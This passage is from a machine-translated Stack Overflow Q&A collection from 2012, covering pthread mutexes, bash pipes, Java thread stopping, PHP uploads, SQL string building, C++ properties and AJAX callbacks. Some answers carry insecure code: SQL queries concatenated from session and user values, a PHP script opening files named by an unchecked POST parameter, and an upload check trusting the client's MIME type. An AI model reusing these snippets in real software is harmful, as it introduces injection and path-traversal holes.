       padding: 15px 5px 15px 230px;
    } 
```

而且我还发现header.php中有一个js函数：

```
 function sizeFrame() {
        var F = document.getElementById("myFrame");
        if(F.contentDocument) {
            F.height = F.contentDocument.documentElement.scrollHeight+30; //FF 3.0.11, Opera 9.63, and Chrome
        } else {
            F.height = F.contentWindow.document.body.scrollHeight+30; //IE6, IE7 and Chrome
        }
    }
    window.onload=sizeFrame; 
```

有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:59:54.277

对于嵌入了 的 HTML 文档`iframe`，您的 JavaScript 代码只需将 30 添加到元素的`height`属性值。`iframe`这解释了值 930。与此处的目标相反，`scrollHeight`您获得的值只是内联框架元素的高度，而不是嵌入文档的内在高度要求。

对于 HTML 以外的类型的嵌入文档，可能会发生奇怪的事情。例如，如果它是纯文本文件，则该`scrollHeight`值可能反映固有的高度要求，从其中的行数得出。在不知道服务器在`./modules/ophthalmology/patients.php`请求时返回什么的情况下，我只能猜测它是非 HTML 的。

# c - posix 互斥锁未按预期工作

> ID：11917692
> 
> 赞同：1
> 
> 时间：2012-08-11T21:11:16.767
> 
> 标签：c, linux, pthreads, mutex

我有个问题。

我初始化了一个静态互斥锁，并试图将它锁定在我的所有函数中。我不小心忘记在其中一个函数中解锁它，但是当我调用另一个也尝试获取互斥锁的函数时，似乎没有发生死锁。

有人可以解释一下为什么不会发生死锁吗？

解释我的问题场景的代码：

```
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

 void main(void)
 {
   func1();  // Mutex acquired initially but not released at end
   func2();  // This function acquires mutex even though mutex was not released by func1();

 }

 void func1(void)
 {
   pthread_mutex_lock(&mutex);

   printf("I am in func1\n");

   //MUTEX NOT UNLOCKED
 }

 void func2(void)
 {
   pthread_mutex_lock(&mutex);

   printf("I am in func2\n");

   //MUTEX AGAIN NOT UNLOCKED
 } 
```

有人可以解释一下为什么在 func2() 中没有发生死锁，因为在 func1() 中没有释放互斥锁？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:21:09.617

根据规范， PTHREAD_MUTEX_INITIALIZER 等效于默认互斥锁：

> 在默认互斥体属性合适的情况下，宏 PTHREAD_MUTEX_INITIALIZER 可用于初始化静态分配的互斥体。该效果等同于通过调用 pthread_mutex_init() 进行动态初始化，参数 attr 指定为 NULL，但不执行错误检查。

对于默认互斥锁，尝试锁定已被调用线程锁定的互斥锁会导致未定义的行为：

> 如果互斥锁类型是 PTHREAD_MUTEX_DEFAULT，尝试递归锁定互斥锁会导致未定义的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:21:34.680

[http://linux.die.net/man/3/pthread_mutex_lock](http://linux.die.net/man/3/pthread_mutex_lock)

> 如果互斥锁类型是 PTHREAD_MUTEX_DEFAULT，尝试递归锁定互斥锁会导致未定义的行为。

您的程序有[未定义的行为](http://blog.regehr.org/archives/213)，因此*可能会*突然输出“格式化根分区，chomp chomp”......谁知道呢。

# ios - iOS：iMessage 样式标题和分隔符 UI

> ID：11917696
> 
> 赞同：3
> 
> 时间：2012-08-11T21:11:34.577
> 
> 标签：ios, uitableview, user-interface

![在此处输入图像描述](../Images/b5645b52991f4290c274d130c412acb0.png)

我正在尝试重新创建 iMessage UI 的各个部分。特别是*顶部按钮*和*分隔线*（即“iMessage”标签+线）

我假设：

*   *顶部按钮*在自定义范围内`UIView`作为`UITableView`
*   分隔线是一种自定义，*带有*`UITableViewCell`居中的标签和某种重复的背景图像……</li>

任何人都可以确认或详细说明这一点吗？特别是*分隔线*。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:16:40.393

首先，我会将分隔线和“iMessage”文本创建为单个图像。

由于分隔线和它上面的按钮是“非粘性的”，我只需创建一个自定义`UITableViewCell`并将所有内容（按钮和分隔线图像）放在表格单元格中。

# android - 如何在 Motodev Studio 中添加一些方法而无需输入

> ID：11917699
> 
> 赞同：0
> 
> 时间：2012-08-11T21:12:07.183
> 
> 标签：android, motodev-studio

例如，如果我想添加这个方法：

```
 @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    //some code I add later...
    } 
```

有没有办法在不输入所有内容的情况下添加它？我知道当我想要 onClick 方法时，我在类中实现它，然后它显示错误，我将鼠标悬停在上面并单击添加未实现的方法，它就在那里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:25:05.350

在 Eclipse 中，右键单击类，从上下文菜单中选择 Source > Override/Implement Methods，然后勾选要添加到类中的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:23:16.393

我知道另一种在eclipse中快速添加此类方法的简单方法。我想你知道智能感知——写一些字符然后按`Ctrl + Space`。如果有多个选项，可用选项将显示在下拉列表中。对于单一选项，单词将被写入。

好吧，现在你的情况`onActivityResult`。键入几个字符，`onActivity`然后触发智能感知。您将看到几个选项的列表。从那里`onActivityResult`通过按向上和向下键进行选择，然后按回车键。你会看到整个方法都被写下来了。

我一直这样做。没有鼠标点击，只需输入几个字符。

# opengl - 具有阴影体积的场景的投影矩阵

> ID：11917704
> 
> 赞同：1
> 
> 时间：2012-08-11T21:12:57.170
> 
> 标签：opengl, graphics, shadow

在[Nvidia 的 GPU Gems 第 9 章](http://http.developer.nvidia.com/GPUGems/gpugems_ch09.html)中，它说用于生成阴影体积的投影矩阵的远平面应该在无穷远处，这样阴影体积就不会被切断。由于阴影体积的投影矩阵在无穷远处结束，我假设场景中每个绘制通道的投影矩阵也应该在无穷远处有其远平面。

这是否会降低深度测试的质量，因为在更大的深度上使用相同数量的比特？人们真的在无穷远处使用远平面吗？效果好吗？还是有其他方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T03:05:30.537

是的，我使用了一个无限远的平面，它工作得很好。如果您进行数学计算，则近平面对于保存深度位更为重要。

我在这里写下了我自己对数学的看法：[http ://www.jwwalker.com/pages/depth_resolution.html](http://www.jwwalker.com/pages/depth_resolution.html)

# bash - 将多个命令通过管道传输到一个命令中

> ID：11917708
> 
> 赞同：68
> 
> 时间：2012-08-11T21:13:04.080
> 
> 标签：bash, shell, process, pipe, subshell

如何将多个命令的标准输出通过管道传输到单个命令？

示例 1：对所有三个 echo 命令的输出进行组合和排序：

```
echo zzz; echo aaa; echo kkk 
```

所需的输出：

```
aaa
kkk
zzz 
```

示例 2：重写以下内容，以便所有命令都在使用管道的单个命令行中，而不重定向到临时文件：

```
setopt > /tmp/foo; unsetopt >> /tmp/foo; set >> /tmp/foo; sort /tmp/foo 
```

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2012-08-11T21:13:04.080

使用括号 () 将命令组合成一个进程，这将连接每个命令的标准输出。

示例 1（注意`$`是 shell 提示符）：

```
$ (echo zzz; echo aaa; echo kkk) | sort
aaa
kkk
zzz 
```

示例 2：

```
(setopt; unsetopt; set) | sort 
```

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2017-02-15T19:12:57.070

您可以使用`{}`它并消除对子外壳的需要`(list)`，如下所示：

```
{ echo zzz; echo aaa; echo kkk; } | sort 
```

我们确实需要一个空格字符 after`{`和 before `}`。`;`当序列写在一行上时，我们还需要最后一个。

我们也可以将它写成多行而不需要任何`;`：

示例 1：

```
{
  echo zzz
  echo aaa
  echo kkk
} | sort 
```

示例 2：

```
{
  setopt
  unsetopt
  set
} | sort 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-12-12T14:36:52.233

在 Windows 中，它将如下所示：`(echo zzz & echo aaa & echo kkk) | sort`

或者，如果它在批处理文件中，它可以是单行（如示例）以及多行：

```
(
 echo zzz
 echo aaa
 echo kkk
) | sort 
```

注意：原来的帖子没有提到它只适用于 Linux，所以我添加了 Windows 命令行的解决方案......当使用 VHD/VHDX 与脚本 ( `echo diskpart_command`) 中的磁盘部分而不是相同的 echo 时，它非常有用，但是让那里`echo`，还有另一种没有回声和`>`重定向器的方法，但它很容易出错并且编写起来更复杂（如果存在一种总是很好用的简单方法，为什么要使用复杂的容易出错的方法）.. . 还记得`%d%`给你实际的路径（对于不对 VHD/VHDX 文件的路径进行硬编码非常有用）。

# struts2 - struts2 jquery subgrid 改变高度行

> ID：11917712
> 
> 赞同：1
> 
> 时间：2012-08-11T21:13:52.027
> 
> 标签：struts2, height, jqgrid

我将 jQueryGrid 与 Struts2 一起使用。当我使用子网格时，行高发生了变化。是否可以设置行高？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:50:50.097

You can read about `subgrid` [here](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3asubgrid) and [here](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3asubgrid_as_grid). That will help you understand the options to use. Hope this helps.

# xaml - 在 Metro 风格应用程序中以编程方式更改按钮的背景图像

> ID：11917713
> 
> 赞同：3
> 
> 时间：2012-08-11T21:14:00.510
> 
> 标签：xaml, windows-8, microsoft-metro, windows-runtime

如何使用 VS 2012 在 Metro Style 应用程序中更改按钮的背景图像？在 Windows 窗体中，按钮具有可以设置的 BackgroundImage 属性。此功能是否适用于 Metro Style 应用程序？

在 Windows 窗体中，我可以在 C# 中执行以下操作：

btnImage.BackgroundImage = System.Drawing.Image.FromFile("...\Pictures\flower.png");

如何以编程方式更改 Metro Style 应用程序中按钮的背景图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:11:33.753

非常简单，实际上，只需修改 Button 的 XAML 以包含一个结束标记，并在其间放置一个图像控件，如下所示：

```
<Grid Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
    <Button HorizontalAlignment="Left" Margin="532,285,0,0" VerticalAlignment="Top" Height="135" Width="283">
        <Image Source="Assets/Logo.png" />
    </Button>
</Grid> 
```

在上面的代码片段中，我将图像源指向 Logo.png 文件，该文件是 C#/XAML 应用程序内置模板的一部分。

另一种方法是在 Blend for Visual Studio 中打开项目，将图像从 Assets 选项卡拖到设计图面上（确保在 Objects and Timeline 窗格中选择了所需的容器），然后右键单击图像并选择 Make into Control...，然后选择 Button 控件。

这种技术的唯一缺点是您无法获得内置 Button 控件所具有的默认 VisualStates。相反，Blend 使用空的 VisualStates 为您定义样式，您可以根据需要设置样式。

希望有帮助。

# java - 通过摆动按钮停止线程

> ID：11917714
> 
> 赞同：2
> 
> 时间：2012-08-11T21:14:14.267
> 
> 标签：java, multithreading, swing

我做了一个简单的程序，它只跟踪鼠标光标的坐标——它工作得很好，我想做的就是用一个按钮启动/停止它。

到目前为止，按钮很好地启动了线程，我可以安全地停止线程的最佳方法是什么？这是因为我将来可能会添加一个工具来将坐标写入文本文件。

我是否制作了一个布尔值，使线程仅在它为真或类似的情况下运行？因为我试图编辑触发器布尔值，但它没有任何影响。

代码原样：

运行线程的类

```
public class tester {

static int startTime = (int) System.currentTimeMillis();
static boolean trigger = false;
static JLabel label = new JLabel();
static JLabel status = new JLabel();
static mouseLocate msl = new mouseLocate();
static JButton startButton = new JButton("Begin tracking");
static JButton stopButton = new JButton("Stop Tracker");
static Thread myThread = new Thread(new mouseLocate());

public static void main(String[] args) {
    JFrame frame = new JFrame("Mouse Grabber");
    frame.setVisible(true);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setSize(500, 100);
    JPanel panel = new JPanel();
    frame.add(panel);

    panel.add(startButton);
    startButton.addActionListener(new startAction());

    panel.add(label);
    panel.add(status);
}

static class startAction implements ActionListener {

    public void actionPerformed(ActionEvent e) {

        try {

            if (trigger == false) {
                trigger = true;
                msl.setTrigger(trigger);
                //label.setText("Trigger Active" + msl.isTrigger());
                startButton.setText("Continue Tracking");
            } else if (trigger == true) {
                trigger = false;
                //msl.setTrigger(trigger);
                label.setText("Trigger Inactive");
                startButton.setText("Stop Tracking");
            }
        } catch (Exception exp) {
            System.out.println("EXCEPTION CAUGHT " + e);
        }

        //RUN 
        myThread.start();

    }
} 
```

鼠标定位类：

```
public class mouseLocate implements Runnable {

private boolean trigger = false;
private int startTime = (int) System.currentTimeMillis();
static String status = "";

public void run() {
    int x, y;
    while (mouseGrabber.trigger = true) {

        try {
            PointerInfo mouseLocation = MouseInfo.getPointerInfo();
            x = mouseLocation.getLocation().x;
            y = mouseLocation.getLocation().y;
            System.out.println("X:" + x + " Y:" + y + "        Elapsed time:  "
                    + (((int) System.currentTimeMillis() - startTime) / 100));

        } catch (Exception e) {
            System.out.println("Exception caught : " + e);
        }
    }

}

public int getStartTime() {
    return startTime;
}

public void setStartTime(int startTime) {
    this.startTime = startTime;
}

public boolean isTrigger() {
    return trigger;
}

public void setTrigger(boolean trigger) {
    this.trigger = trigger;
}

public static String getStatus() {
    return status;
}

public static void setStatus(String status) {
    mouseLocate.status = status;
} 
```

}

谢谢你的帮助，我真的很感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:20:38.567

java 不再有 stopThread() api。您应该将标志设置为**volatile**，并且您的停止线程按钮只需设置标志变量值。

```
public volatile boolean flag;

public void run() {
   while(flag) {
       // Get coordinate or whatever you want      
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-12T06:09:57.263

```
 public volatile boolean isShutingDown;   

public void run() {
   while(!isShutingDown) {

   }
} 
```

**需要停止时调用shutDown()方法**

```
public void shutDown(){

     isShutingDown = true
    } 
```

# php - 读取标题后中止上传大型上传

> ID：11917717
> 
> 赞同：2
> 
> 时间：2012-08-11T21:15:00.013
> 
> 标签：php, http, sockets

我想要一个包含文件上传的 PHP 脚本的 HTTP POST。PHP 脚本应该拒绝任何类型不正确或格式错误的文件。

这表示

1.  PHP 脚本在上传完成之前开始执行，
2.  它读取文件的前 X 个字节，并且
3.  可能在上传完成之前中止连接。

我该如何做这些？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:18:48.613

PHP 不能中止上传。但是您可以`$_FILES`在文件完全上传后进行验证。

> 此功能允许人们上传文本和二进制文件。使用 PHP 的身份验证和文件操作功能，您可以完全控制允许上传的人员以及文件**上传后**的处理方式。

看：

[http://php.net/manual/en/features.file-upload.post-method.php](http://php.net/manual/en/features.file-upload.post-method.php)

您可以限制 php.ini 中的文件大小

> upload_max_filesize 整数
> 
> 上传文件的最大大小。使用整数时，该值以字节为单位。也可以使用本常见问题解答中描述的速记符号。

[http://www.php.net/manual/en/ini.core.php#ini.upload-max-filesize](http://www.php.net/manual/en/ini.core.php#ini.upload-max-filesize)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:20:15.043

这是您可以获得的最大值。

```
<?php
$allowedExts = array("jpg", "jpeg", "gif", "png");
$extension = end(explode(".", $_FILES["file"]["name"]));
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
&& ($_FILES["file"]["size"] < 20000)
&& in_array($extension, $allowedExts))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Error: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Stored in: " . $_FILES["file"]["tmp_name"];
    }
  }
else
  {
  echo "Invalid file";
  }
?> 
```

# c# - 有没有像 Ext JS 这样的库，但对于 C#，尤其是 WPF？

> ID：11917719
> 
> 赞同：3
> 
> 时间：2012-08-11T21:15:31.047
> 
> 标签：c#, wpf, extjs

我正在寻找一个库，它允许我以类似于 Ext JS 的方式构建应用程序，使用 MVC 方法（带有 PRISM 的 MVVM 在 .net 应用程序上也可以。我正在考虑使用 EF 来处理数据库对象），特别是Ext JS 提供了一些不错的组件。

我特别考虑了对管理应用程序非常有用的网格组件。

我只找到了 Telerik，但它的价格为 1200 美元，我正在寻找可能免费或不超过 500 美元的东西，我知道我的预算很低，但我必须考虑我什至应该购买 Visual Studio（900 美元），而且这是很多钱作为一个人开始一个项目。

**编辑1：** 我找到了这个库，但成本与telerik基本相同：[https ://www.componentone.com/Store/?product=145](https://www.componentone.com/Store/?product=145)

**编辑2：** 这有点便宜：[http ://www.devexpress.com/Products/NET/Controls/WPF/Grid/#main|buy](http://www.devexpress.com/Products/NET/Controls/WPF/Grid/#main|buy)

**编辑3：** 这甚至更便宜，但它看起来像缺少数据网格的过滤功能，我认为这是必须具备的： http: [//www.devcomponents.com/store/Scripts/prodView.asp?idproduct=26](http://www.devcomponents.com/store/Scripts/prodView.asp?idproduct=26)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:39:20.583

不适合您的图书馆需求，但：

对于您的 Visual Studio（和其他 MS 软件）要求，请查看[WebsiteSpark](http://www.microsoft.com/web/websitespark/)和[BizSpark](http://www.microsoft.com/bizspark/default.aspx)。简而言之，WebsiteSpark 适用于为其他公司开发网站的初创公司，而 BizSpark 适用于正在开发自己的软件的初创公司。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:47:51.253

您**可能**正在搜索[WPF Toolkit](http://wpf.codeplex.com/)和/或[Extended WPF Toolkit](https://wpftoolkit.codeplex.com/releases/view/84227)。这些是带有一组*免费*可用的 WPF 控件的库。

另外，为了能够用 C#/WPF 开发一些东西，你可以使用[Visual Studio Express Edition](http://www.microsoft.com/visualstudio/en-us/products/2010-editions/express)，它也是*免费*的。

# c++ - 如何通过定义隐藏字段并仅提供setter和getter？

> ID：11917721
> 
> 赞同：1
> 
> 时间：2012-08-11T21:15:42.317
> 
> 标签：c++, boost, boost-preprocessor

我想知道如何隐藏一个真实的属性字段（不是将其设为私有或公共，而是强制使用 setter 和 getter）并为他提供简单的 setter 和 getter。所以我想知道如何创建 api，如：

```
private:
    Property( int my_a);
public:
    Property( int my_b);
...
{
 set_my_a(1);
 cout << get_my_a() << endl;
 // my_a = 13; // will cause compiler error
... 
```

如何通过 Boost 预处理器创建这样的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T08:20:10.040

你真的需要使用boost预处理器吗？您在下面有一个没有提升的解决方案：

```
// property.h    
#include <stdio.h>

#define property(type) struct : public Property <type>  

template <typename T>
class Property 
{
protected:
  T value;
public:
  virtual T get() { 
    return value; 
  }
  virtual void set(T new_value) { 
    value = new_value; 
  }
}; 
```

用法示例：

```
// test.cpp
#include "property.h"

class Test {
public:
  property(int) {} a;

  property(int)  {
    int get() { 
      return value * 10; 
    } 
  } b;

  property(int) {
    void set(int x) {
      value = x * 200;
    } 
  } c;

  property(int) {
    int get() { 
      return value * 3000; 
    } 
    void set(int x) {
      value = x * 443;
    } 
  } d;
};

main()
{
  Test t;

  printf("i\ta\tb\tc\td\t\n");
  for (int i=0; i<10; i++) { 
    t.a.set(i);
    t.b.set(i);
    t.c.set(i);
    t.d.set(i);
    printf("%i\t%i\t%i\t%i\t%i\n", i, t.a.get(), t.b.get(), t.c.get(), t.d.get());
  }
} 
```

[http://en.wikipedia.org/wiki/Property_(programming)#C.2B.2B](http://en.wikipedia.org/wiki/Property_(programming)#C.2B.2B)中的维基百科解决方案很好，但需要进行最少的修改才能变得有用，因为没有受保护的语句，您无法编写自己的 getter 和 setter .

```
#include <iostream>

template <typename T> 
class property {
protected:
  T value;
public:
  T & operator = (const T &i) {
    ::std::cout << i << ::std::endl;
    return value = i;
  }
  operator T const & () const {
    return value;
  }
};

struct Bar {
  property <bool> alpha;
  struct :public property <int> {
    int & operator = (const int &i) {
      ::std::cout << "new setter " << i << ::std::endl;
      return value = i;
    }
  } bravo;
};

main() 
{
  Bar b;
  b.alpha = false;
  b.bravo = (unsigned int) 1;
} 
```

如果你愿意，你可以再改变一点：

```
#include <iostream>
#define SETTER(type) public: type& operator=(const type new_value)
#define GETTER(type) public: operator type const & () const

template <typename T> 
class Property {
protected:
  T value;
public:
  T & operator = (const T &i) {
    ::std::cout << i << ::std::endl;
    return value = i;
  }
  template <typename T2> T2 & operator = (const T2 &i) {
    ::std::cout << "T2: " << i << ::std::endl;
    T2 &guard = value;
    throw guard; // Never reached.
  }
  operator T const & () const {
    return value;
  }
};

struct Bar {
  Property <bool> alpha;
  struct:Property <int> {
    SETTER(int) {
      value = new_value * 1000;
      ::std::cout << "new method " << new_value << ::std::endl;
      return value;
    }
    GETTER(int) {
      return value/1000;
    }
  } bravo;
};

main() 
{
  Bar b;
  b.alpha = false;
  b.bravo = (unsigned int) 1;
  ::std::cout << b.bravo << ::std::endl;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:49:03.593

与其重写实现示例，不如使用维基百科上的链接：[http ://en.wikipedia.org/wiki/Property_(programming)#C.2B.2B](http://en.wikipedia.org/wiki/Property_(programming)#C.2B.2B)

这基本上强制通过 getter/setter 方法访问属性。获得所需效果所需的升级是将函子传递给这些属性的能力。有很多关于实施这些的想法；我无法建议的最佳方法取决于您的发展需求。就个人而言，这感觉像是过度工程，并且更喜欢只使用 Pimpl 来隐藏我的私人细节并明确提供 getter/setter。

# php - 在查询中连接变量

> ID：11917729
> 
> 赞同：0
> 
> 时间：2012-08-11T21:16:53.923
> 
> 标签：php, mysql

连接此查询的正确方法是什么？

```
$query2= "SELECT * FROM relationships WHERE user_1= '.$_SESSION['user_id'].'     
AND user_2= '.$user_id.' "; 
```

我不断收到此错误：

解析错误：语法错误，意外的 T_ENCAPSED_AND_WHITESPACE，在第 32 行的 C:\xampp\htdocs\beta\profile.php 中需要 T_STRING 或 T_VARIABLE 或 T_NUM_STRING

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T21:19:00.693

> 连接此查询的正确方法是什么？

让您的 SQL 库/客户端/服务器为您执行此操作（同时免费转义特殊字符）。尝试通过将字符串混合在一起来构建代码相对容易出错，并且涉及各种难以维护的引号字符的巧妙组合。

请改用[准备好的语句和绑定的参数](https://stackoverflow.com/a/60496/19068)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T21:19:00.673

您的单引号和双引号嵌套不正确。

```
$query2= "SELECT * FROM relationships WHERE user_1= '" . $_SESSION['user_id'] . "' AND user_2= '" . $user_id . "'"; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T21:24:26.723

任何一个：

```
$query2 = "SELECT * FROM relationships WHERE user_1='" . $_SESSION['user_id'] . "'AND user_2='" . $user_id . "'"; 
```

或者：

```
$query2 = "SELECT * FROM relationships WHERE user_1='${_SESSION['user_id']}' AND user_2='$user_id'"; 
```

修复您的语法错误。但是，通过连接形成查询是一个坏主意。至少，`mysql_realescapestring`如果不转向使用 PDO，您应该所有的论点。

# c++ - MSVC 抱怨函数指针不是编译时常量

> ID：11917730
> 
> 赞同：3
> 
> 时间：2012-08-11T21:17:05.093
> 
> 标签：c++, visual-c++

我正在尝试获取一些最初使用 GCC 构建的代码以使用 MSVC 进行编译，并且在代码中遇到了回调包装类的问题。我提取了以下代码的关键部分：

```
template <typename T_func>
struct internal_parameter_resolver;

template <typename R>
struct internal_parameter_resolver<R()> {
    typedef R(*type)();
};

template <typename R, typename P1>
struct internal_parameter_resolver<R(P1)> {
    typedef R(*type)(P1);
};

template <typename T_func, typename internal_parameter_resolver<T_func>::type func>
void bind() {
    // Create and return instance of class Callback...
}

double func1() { return 0.5; }
int func2(double i) { return 0; }

int main() {
    bind<double(), &func1>();    // (Line 23)
    bind<int(double), &func2>(); // (Line 24)

    return 0;
} 
```

虽然这在 GCC 下编译得很好，但 MSVC 2010 给出了以下错误消息：

```
1>c:\users\public\documents\projects\_test\_test\main.cpp(23): error C2975: 'func' : invalid template argument for 'bind', expected compile-time constant expression
1>          c:\users\public\documents\projects\_test\_test\main.cpp(14) : see declaration of 'func'
1>c:\users\public\documents\projects\_test\_test\main.cpp(24): error C2975: 'func' : invalid template argument for 'bind', expected compile-time constant expression
1>          c:\users\public\documents\projects\_test\_test\main.cpp(14) : see declaration of 'func' 
```

有人知道为什么 MSVC 认为这些函数指针不是编译时常量吗？还是代码中其他地方的问题（即不是第 23 和 24 行）？如果它是编译器中的错误，我会欢迎任何有关可能解决方法的建议。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:35:56.540

```
template <typename T_func, T_func* >
void bind() {
    // Create and return instance of class Callback...
} 
```

Visual C++ 不擅长解析间接类型定义，但它对更具体的类型很满意，就像上面一样。

上面显示了如何使用 Visual C++ 处理您遇到的*直接问题。*

但是，更好的设计是使用自动模板参数推导：

```
template <typename T_func >
void bind( T_func const func ) {
    // Create and return instance of class Callback...
}

double func1() { return 0.5; }
int func2(double i) { return 0; }

int main() {
    bind( func1 );      // (Line 23)
    bind( func2 );      // (Line 24)
} 
```

如果需要，您可以从 获取函数结果类型`std::function`，依此类推。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:36:11.397

我看不出有任何理由将`func1`其`func2`作为非类型模板参数传递。

最好将它们作为参数（而不是模板参数）传递，并让`internal_parameter_resolver`trait 推断其类型：

```
template <typename T_func>
struct internal_parameter_resolver;

template <typename R>
struct internal_parameter_resolver<R()> {
    typedef R(*type)();
};

template <typename R, typename P1>
struct internal_parameter_resolver<R(P1)> {
    typedef R(*type)(P1);
};

template <typename T_func>
void bind(typename internal_parameter_resolver<T_func>::type func) {
    // Create and return instance of class Callback...
}

double func1() { return 0.5; }
int func2(double i) { return 0; }

int main() {
    bind<double()>(func1);    // (Line 23)
    bind<int(double)>(func2); // (Line 24)

    return 0;
} 
```

我手头没有VC，但应该可以编译。

# java - 具有最终上限的通配符

> ID：11917731
> 
> 赞同：9
> 
> 时间：2012-08-11T21:17:15.133
> 
> 标签：java, generics, bounded-wildcard

`Class<? extends Integer>`可以正常编译，但是`Integer`是最终类型，因此将其用作上限是没有意义的（什么都不会`extend`）。

如果您尝试使用最终类型作为类型参数的上限，您将收到编译器警告：

> 类型参数 T 不应受最终类型 Integer 的限制。最终类型无法进一步扩展

为什么使用最终类型作为通配符的上限完全没问题，但会为类型参数抛出警告？为什么 Java 甚至允许通配符以最终的大写类型为界？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T21:47:18.137

`Class<Integer>`不像`Class<? extends Integer>`.

例如，这编译：

```
Class<? extends Number> numberClass = Integer.class;
Class<? extends Integer> integerClass = numberClass.asSubclass(Integer.class); 
```

这不会：

```
Class<? extends Number> numberClass = Integer.class;
Class<Integer> integerClass = numberClass.asSubclass(Integer.class); 
```

我自己，我无法像您一样收到编译器警告（也许您可以提供有关编译器的示例和详细信息？）。

# javascript - 如何在 ajax 调用后更改包装器 JavaScript 函数中的全局变量？

> ID：11917734
> 
> 赞同：31
> 
> 时间：2012-08-11T21:17:38.020
> 
> 标签：javascript, jquery

```
function ajax_test(str1){ 
  var url = "None" 
  jq.ajax({
    type:'post', 
    cache: false, 
    url: 'http://....' + str1, 
    success: function(data, status, xhr){ 
      url=data; 
    }, 
    error: function (xhr, status, e) {  
    }, 
    async: true, 
    dataType: 'json' 
  }); 
  return url 
} 
```

如何将全局变量设置`url`为返回的成功 ajax 数据？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-11T21:34:54.187

在 Javascript 中，函数不可能`return`产生异步结果。该函数通常会在 AJAX 请求发出之前返回。

您始终可以强制您的请求与 同步`async: false`，但这通常不是一个好主意，因为它会导致浏览器在等待结果时锁定。

解决这个问题的标准方法是使用回调函数。

```
function ajax_test(str1, callback){  
   jq.ajax({ 
     //... your options
     success: function(data, status, xhr){  
       callback(data);
     }
   });  
} 
```

然后你可以这样称呼它：

```
ajax_test("str", function(url) {
  //do something with url
}); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-01-15T20:59:02.660

这是我从 php 检索数据的示例代码，然后将值传递给 ajax 成功函数中的 javascript 全局变量。这个对我有用！

```
var retVal = null; 

function ajaxCallBack(retString){
    retVal = retString;
}

function readString(filename){
    $.ajax({  
        type: "POST",  
        url: "readString.php",  
        data: { 'fn': filename },      
        success: function(response){
            ajaxCallBack(response);
        }
    }); 
} 
```

PHP 代码（readString.php）：

```
<?php

     $fn  = $_POST['fn'];

     $file = fopen("path/".$fn.".record","r");
     $string = fread($file,filesize("path/".$fn.".record"));
     fclose($file); 

     echo $string;  
?> 
```

但是，由于 $.ajax() 是异步发送请求的，这意味着它可能会在成功回调运行之前返回，因此您不应依赖它顺序运行并自行返回值。因此，这里我们将php响应值分配给回调函数中的全局值。

# entity-framework-4.1 - 如何使用可移植类库和 EF 代码优先？

> ID：11917736
> 
> 赞同：9
> 
> 时间：2012-08-11T21:18:04.233
> 
> 标签：entity-framework-4.1, portable-class-library

我正在做一个 Windows Phone 应用程序，其中我有一个在 Azure 中运行的 WebApi。

我正在为我的“模型”项目使用新的“便携式类库”（http://msdn.microsoft.com/en-us/library/gg597391.aspx），该项目在我的 WebApi 项目之间共享（这是一个普通的 ASp.NET MVC 4 项目）和我的 Windows Phone 项目。

这很好用，模型（POCO）类可以按照我的意愿进行序列化和反序列化。

现在我想开始存储我的一些模型/POCO 对象，并希望为此使用 EF 代码优先，但这是一个问题，因为我无法将 EntityFramework 程序集添加到我的“可移植类库”项目中，并且真的我也不想，因为我的模型项目中只需要一小部分（属性）。

那么，对于如何以最佳方式进行处理有什么建议吗？

更新：好吧，看来我实际上可以将 EntityFramework 程序集添加到项目中，但这并没有真正帮助我，因为我需要使用的属性存在于 System.ComponentModel.DataAnnotations 中，而这些属性不能在 Windows Phone 上使用. 还有什么建议吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-12T09:15:38.247

不要使用属性。改用 fluent API 并为持久性 (EF) 创建单独的程序集，该程序集将引用您的模型程序集。您的 WebAPI 层将使用持久性程序集。

